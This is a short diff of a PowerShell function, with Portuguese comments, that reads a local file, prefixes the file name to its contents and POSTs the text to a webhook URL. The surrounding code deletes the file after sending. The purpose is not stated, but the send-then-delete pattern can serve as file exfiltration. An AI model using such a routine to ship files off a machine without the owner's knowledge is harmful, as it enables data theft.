@@ -185,7 +185,21 @@ function send_file_to_webhook {
 
     # Envia e apaga o arquivo após envio
     try {
+        ##### adicionado #####
+        # Obtém o nome do arquivo e seu conteúdo
+        $fileName = [System.IO.Path]::GetFileName($resolvedPath)
+        $fileContent = Get-Content -Path $resolvedPath -Raw
+
+        # Monta a string no formato "nome-do-arquivo: conteudo"
+        $payloadText = "$fileName: $fileContent"
+
+        # Converte a string montada para bytes UTF-8
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadText)
+
+        # Envia a requisição
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'
+        ######################
+        #Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'
 
         # Remove o arquivo após envio
         if (Test-Path -Path $resolvedPath) {
